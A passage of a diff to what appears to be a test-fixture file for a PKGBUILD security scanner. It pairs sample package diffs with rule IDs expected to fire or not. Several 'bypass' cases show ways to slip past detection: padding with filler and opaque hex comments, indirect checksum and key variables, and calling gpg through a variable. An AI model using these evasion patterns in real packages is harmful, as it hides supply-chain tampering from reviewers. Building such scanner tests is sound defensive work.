+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  printf -v Ax7Bq3Kz '%s' one\n+  printf -v Cd9Em4Lw '%s' one\n+  printf -v Fg2Hn5Mv\
+    \ '%s' one\n+  printf -v Jk6Pp8Rs '%s' one\n+  printf -v Tu1Vw9Xy '%s' one\n+\
+    \  # a5cd6 4d3c1 ca264 18b8f 25165 3031d bb3b9 1db20 6dece 1332a 2c014 de06c\n\
+    +  # d61aa 23c41 7b382 2e71e d95a9 1e43b 3f62f 724c6 1fac6 cb19b 1963c 7131a\n\
+    +  # 17d9a 442f7 9447a d6996 49dbc 3c4f4 9df15 5c882 34c3b 6030a beaae 31e26\n\
+    +  # 2025e 1e840 69736 fe2a0 daed6 a0d7e ee635 e807c b9215 997b0 7f31c 5c0a6\n\
+    +  # 7cfa3 29e8e 99ba4 fd7fe afdc0 e5cd9 936c9 257a9 3c731 d6143 5475e af21f\n\
+    +  # 4dd0e fa595 d7e8d 1412f 27bdd a0a38 ae248 b34a9 fe4c2 e993b 2334e 2febd\n\
+    +  # 8a357 f2bd0 2147a 1f101 9e84d e42b0 91b68 c5867 b1aaa 0b8d5 ec635 b5ff6\n\
+    +  # 560a6 3bf3f fcc55 1e2f4 6fb8e 932a4 4238e 7ec75 cbb93 c82a8 fe362 2941f\n\
+    +  # 552df e5fbe cda45 8e40e 461b2 dc6d5 8e8d3 d4a1b b7b0d c2c93 76250 4d458\n\
+    +  # 2a7cf 5a393 4d76f 76c30 7777d 062d2 f84d0 5d5c0 8686b 90593 02188 4a961\n\
+    +  # d6802 bd0ec a3211 40406 1ba4f e9cd3 c8e5e cbcfc cc46f c9ca1 3502d f68a2\n\
+    +  # cd06d 1fdef 61979 227b6 6ae30 e199d 53196 38488 ae1b8 1aeb3 346b1 001e9\n\
+    +  # 4d729 33f32 ba2b1 0d0e7 24006 6a78c c0a12 4c0ec 8127e b1dd0 ba73a f2c3f\n\
+    +  # 3ee52 3b0f9 f9e40 ee962 f5f65 f7b92 9fab1 2bf91 49c9c 3451e af6df 878e3\n\
+    +  # f50de 52a81 0bd33 6911f b9379 4b0f7 0dd88 989f3 2e98e 85b0e bbc01 55868\n\
+    +  # b61dc 7211e a8c9d 72328 63ea2 7a910 cd268 74173 665ba fc4de b60c4 0ed67\n\
+    +  # 0e4dc 8f0ff f1c97 84b28 63256 b0459 e4fb0 b2f43 bab18 293c4 70e07 344df\n\
+    +  # 74252 f0ae5 64b6a acebe 68a3a f71e5 00fa2 f57d8 b021a 2b681 3d640 c6ee2\n\
+    +  # 660d3 f4c0b 5b673 de2b6 aa3fb 2c6a7 caab5 ed236 cd829 2b7a8 51559 570ab\n\
+    +  # 410b2 0e1ae 4d639 ee42d 4ad75 f2dee b3689 4fd3c 43105 0af48 074ad 349e8\n\
+    +  # 474bd de1c4 63bd8 6c0db 0e553 80f07 6cf17 95ffb 7b27f a6e81 84cb7 d688d\n\
+    +  # 431c1 1f2ee b5232 ea941 d75c9 42f36 4dbd7 0993a e1580 5dc05 02037 4cb2e\n\
+    +  # 583dd 487a6 f26da 3d9cc 1f9e6 a6e72 f7088 3653f 1d17d 7f3aa 61f2e 8dc81\n\
+    +  # 159b1 320ba e7839 0e446 2071e e2f17 a6b6d 66182 8deb4 e799d f4c12 7eccb\n\
+    +  # 84e94 67b9a e5226 46367 d5517 3e453 c8e3f e25d4 a1c81 2524c 7b350 db4f3\n\
+    +  # 25701 6ce5a 9b05f 3ea4a 4f13a bb7c6 49348 81975 46463 ef7b1 706dd 30313\n\
+    +  # cbe85 f97a3 5359e 728a6 52aba dcf06 cec02 ada0a d7b18 6438a b6963 a315c\n\
+    +  # 2f340 bb5e2 09f9a ad0ba ead6e e183b 09420 c4c8c a9ba1 9745c 20eab 39c77\n\
+    +  # 75050 35a5a 2b0a1 87f80 8b392 1444e 5cf44 8a77e 42551 d831b 84686 cfd86\n\
+    +  # 4c79f fd3dc a772e 2dcdf 8ee14 1d741 5ddf4 d9c32 25137 89b05 089e2 2d588\n\
+    +  # 85670 2ae04 71df7 221c5 87661 3e4c8 e8550 05e96 ada54 d5e4a 8924e 4229c\n\
+    +  # 161f0 7a144 380a0 52a97 86172 19cb5 5cbf2 674e2 9fbd7 9c29a 6967f 9475b\n\
+    +  # e4311 5b15b 8a81e b1aa1 094ca 803ad 12eb0 07db7 09702 61007 f313d 7dc9b\n\
+    +  # e4e47 366a8 dd466 fd70d c9429 9d95b 6e2c3 7589b af76f 65b21 47893 cf348\n\
+    +  # b1f25 1bd8d 42779 074c7 2435c 82dd3 dc8a0 53950 1c5d8 2b419 c302e 90598\n\
+    +  # 7c035 960bc 17295 eb3d6 5ee67 50a82 89bf2 e4431 01dad 86c7c ba70b a8690\n\
+    +  # a5a63 7d281 11a30 9e7d1 6f8c1 b6922 5daca 008c1 abb0b c3649 2af3b f3047\n\
+    +  # 8ecfc 66e6d 7f115 0288e 2e841 87411 2df42 49a8b cc8cb 15555 c9b79 0b845\n\
+    +  # 996b3 9bc5f 7732d 2b415 4f7d3 c76eb a6fb2 fd069 4c866 917f9 4a1cf 166b6\n\
+    +  # dbc5f 47535 083b9 75bac 2b912 0ff44 156ef 4424c b8aea 35b79 c0d41 e71c1\n\
+    +  # 19ffe 09a57 7d36e fa84c 870fd 01b26 e9f52 23e5a 2f130 21d15 f29d9 811f8\n\
+    +  # 261e4 87f73 7835d 69124 76230 ebb1b fce6d c3def 274a7 f540d 931b7 17ef4\n\
+    +  # 65864 27aa6 4b7b4 a9de2 82047 9bdc9 44526 06625 f6ffd 1f0ef f8ba8 899c9\n\
+    +  # 32f42 6f758 faaeb 94eb2 9232c ede84 ee8a2 eec40 3cac6 66041 9f93d 2bf51\n\
+    +  # f225d 08f65 9444f eafe3 27265 e61e6 898d7 c610f 6b6fc 6be20 2633a 2e3c3\n\
+    +  # 48923 860bd b8176 43e4c 8f238 39b0d baf9f 7677e feeb2 f8e76 c9c4e 0cb71\n\
+    +  # 51710 01d69 fbbf9 e6ca0 cf931 9a995 480ac d515b b01b8 c090f a1d4f 3de7d\n\
+    +  # a9a35 00e43 a62b1 ad321 cbe8a 3d760 64382 06006 9464f 81a50 be93e 2144b\n\
+    +  # c92a1 c7c33 271df b8aee db29b 8ce12 18b69 8fafb 34135 1a6d9 923d3 4c3e8\n\
+    +  # 7fa77 880d8 df5af a1968 6133e bf27a db01b 0eda9 ccd24 6828b 29416 1954e\n\
+    +  # d25fa e6d72 46f2f 9289e f89d4 19138 412ef 576e3 f1c21 d4696 aff49 90410\n\
+    +  # 98758 82f0b 8534e cffaa 7a324 9a073 f763a c9ea9 3d4ee 55ac9 52c4b 267cc\n\
+    +  # 6a6e4 fe80b 70a72 e7edc aa694 e6613 dad73 47792 62832 7cf8c 2e722 5971a\n\
+    +  # af14c 2ea3e a379a 7a6ec bc928 84477 677f2 0a482 d3581 c4035 d3e88 6b85c\n\
+    +  # c0f48 8a5ce ad28f 1fc64 ff0cf 8e169 b864f 40728 6e92b 2f690 8ac33 7f355\n\
+    +  # c4e52 ccacf e4478 dd19b 9fc09 0b2ab 41268 10823 d9b3c f2503 faca4 00176\n\
+    +  # 25725 c8757 efb18 e5dcd 7f36d 37d4e 7295f 4f0aa 4ddbe 37c07 ea268 2b859\n\
+    +  # 143f6 00b30 40556 77144 133f3 9b895 4184d 80eb2 dff6e 39697 32ea6 24052\n\
+    +  # 99c76 6226b c6b2a 85924 72797 0096f 055b3 9a60f ebdfa 8ea52 a1f98 7c164\n\
+    +  # f35b1 78338 7e7e6 0efde d2d8c 9d633 1c516 0b27b 63631 ff228 d70c5 2984e\n\
+    +  # 83b71 74a78 d940c bd8d3 741d4 fc631 11753 ad151 d7533 b981f caef7 656ab\n\
+    +  # 03753 958f9 22868 69126 fdcbd 669ca 9f993 634b3 762c9 ee236 7160f 87b0f\n\
+    +  # 97017 37cfe fdd4d 5fe78 72578 f858d d584d 1ce2b 4af2b c9739 1bd4d 6d07a\n\
+    +  # 0c191 48a89 d4ad5 1a8ad 1eca0 5e42f c9617 e6377 a0ded 39f61 28a20 54cdf\n\
+    +  # a8928 61a14 5efb7 ef6b5 10545 9fa7c c1da6 bf6da a9d44 e286d 56a95 37c94\n\
+    +  # 01784 280f5 8f42c 2959c b3f37 d7223 3f56b 6a30a c2a05 b6981 9e0dd dd69f\n\
+    +  # 2ceee 19384 f269e 6434d bed46 e487a 62d45 a588c ba7ed f2f62 0f812 d2549\n\
+    +  # 7efb9 cf3e5 14d00 c04a6 11d86 ed980 200a7 1fbef 83979 63cf5 202e1 ad9a8\n\
+    +  # b9d7c 8b6cd ab814 1650d 863b7 a20a2 8d1f6 98459 01ee5 21733 0c6b5 77bd5\n\
+    +  # 36eaf f34bf ee75f c5e54 80893 dc20d fca89 43f23 fe3a9 5daa3 04750 9b4c1\n\
+    \ }\n package() {\n   true\n"
   expect_absent:
   - E001
   - E002
   - E003
 - id: P001-P003-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,8 +4,13 @@\n arch=(\"any\")\n pkgdesc=\"probe\"\n license=(\"MIT\")\n-source=()\n+source=(\"https://example.com/probe-1.0.0.tar.gz\"\n+        \"https://example.com/probe-1.0.0.tar.gz.sig\")\n+sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'\n+            'SKIP')\n+validpgpkeys=('0123456789ABCDEF0123456789ABCDEF01234567')\n build() {\n+  gpg --verify \"$srcdir/probe-1.0.0.tar.gz.sig\"\n   true\n }\n package() {\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,8 +4,13 @@\n arch=(\"any\")\n pkgdesc=\"\
+    probe\"\n license=(\"MIT\")\n-source=()\n+source=(\"https://example.com/probe-1.0.0.tar.gz\"\
+    \n+        \"https://example.com/probe-1.0.0.tar.gz.sig\")\n+sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'\n\
+    +            'SKIP')\n+validpgpkeys=('0123456789ABCDEF0123456789ABCDEF01234567')\n\
+    \ build() {\n+  gpg --verify \"$srcdir/probe-1.0.0.tar.gz.sig\"\n   true\n }\n\
+    \ package() {\n"
   expect_fire:
   - P001
   - P002
   - P003
 - id: P001-P003-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,8 +4,16 @@\n arch=(\"any\")\n pkgdesc=\"probe\"\n license=(\"MIT\")\n-source=()\n+_sum=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'\n+      'SKIP')\n+_k=('0123456789ABCDEF0123456789ABCDEF01234567')\n+source=(\"https://example.com/probe-1.0.0.tar.gz\"\n+        \"https://example.com/probe-1.0.0.tar.gz.sig\")\n+sha256sums+=(\"${_sum[@]}\")\n+validpgpkeys=(\"${_k[@]}\")\n build() {\n+  _g=gpg\n+  \"$_g\" --verify \"$srcdir/probe-1.0.0.tar.gz.sig\"\n   true\n }\n package() {\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,8 +4,16 @@\n arch=(\"any\")\n pkgdesc=\"\
+    probe\"\n license=(\"MIT\")\n-source=()\n+_sum=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'\n\
+    +      'SKIP')\n+_k=('0123456789ABCDEF0123456789ABCDEF01234567')\n+source=(\"\
+    https://example.com/probe-1.0.0.tar.gz\"\n+        \"https://example.com/probe-1.0.0.tar.gz.sig\"\
+    )\n+sha256sums+=(\"${_sum[@]}\")\n+validpgpkeys=(\"${_k[@]}\")\n build() {\n+\
+    \  _g=gpg\n+  \"$_g\" --verify \"$srcdir/probe-1.0.0.tar.gz.sig\"\n   true\n }\n\
+    \ package() {\n"
   expect_absent:
   - P001
   - P002
   - P003
 - id: P005-control
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,7 +4,7 @@\n arch=(\"any\")\n pkgdesc=\"probe\"\n license=(\"MIT\")\n-source=()\n+source=(\"git+https://example.com/probe.git#commit=0123456789abcdef0123456789abcdef01234567\")\n build() {\n   true\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,7 +4,7 @@\n arch=(\"any\")\n pkgdesc=\"\
+    probe\"\n license=(\"MIT\")\n-source=()\n+source=(\"git+https://example.com/probe.git#commit=0123456789abcdef0123456789abcdef01234567\"\
+    )\n build() {\n   true\n }\n"
   expect_fire:
   - P005
 - id: P005-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,7 +4,7 @@\n arch=(\"any\")\n pkgdesc=\"probe\"\n license=(\"MIT\")\n-source=()\n+source=(\"git+https://example.com/probe.git#commit=abc123\")\n build() {\n   true\n }\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -4,7 +4,7 @@\n arch=(\"any\")\n pkgdesc=\"\
+    probe\"\n license=(\"MIT\")\n-source=()\n+source=(\"git+https://example.com/probe.git#commit=abc123\"\
+    )\n build() {\n   true\n }\n"
   expect_absent:
   - P005
